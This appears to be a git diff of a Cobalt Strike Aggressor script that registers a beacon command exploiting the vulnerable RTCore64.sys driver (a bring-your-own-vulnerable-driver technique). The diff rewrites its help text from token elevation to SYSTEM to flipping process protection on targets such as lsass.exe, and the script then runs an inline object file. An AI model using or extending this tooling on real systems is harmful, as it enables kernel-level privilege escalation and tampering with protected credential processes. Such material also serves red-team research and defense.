@@ -1,8 +1,8 @@
 # author @mooolight
 
 beacon_command_register(
-	"byovd-rtcore64-tokenconf-flipprocprotection", "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.",
-	"INFO:\nCapabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.\n\n" .
+	"byovd-rtcore64-tokenconf-flipprocprotection", "Flip the protection of the target process to Fully Protected Process or Process Protected Light by exploiting the vulnerable RTCore64.sys.",
+	"INFO:\nFlip the protection of the target process to Fully Protected Process or Process Protected Light by exploiting the vulnerable RTCore64.sys.\n\n" .
 	"ARGUMENTS:\n[<targetProc>]: Target process for the action parameter.\n[<prot_type>]: When flipping the process protection , choose whether to flip to Process Protection Light or Process Protection.[<pers>]: Status whether the exploited service will persist or not.\n\n" .
 	"USAGE:\nbyovd-rtcore64-tokenconf-flipprocprotection <targetProc> <ppl | pp> <pers>\n\n".
 	"EXAMPLES:\nbyovd-rtcore64-tokenconf-flipprocprotection <lsass|csrss>.exe ppl FALSE\n\n");
@@ -34,6 +34,6 @@ alias byovd-rtcore64-exploit {
     # Pack our arguments
     $arg_data  = bof_pack($bid,"zzz",$targetProc,$prot_type,$pers);
 
-    blog($bid, "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.");
+    blog($bid, "Flip the protection of the target process to Fully Protected Process or Process Protected Light by exploiting the vulnerable RTCore64.sys.");
     beacon_inline_execute($bid, $data, "go", $arg_data);
 }
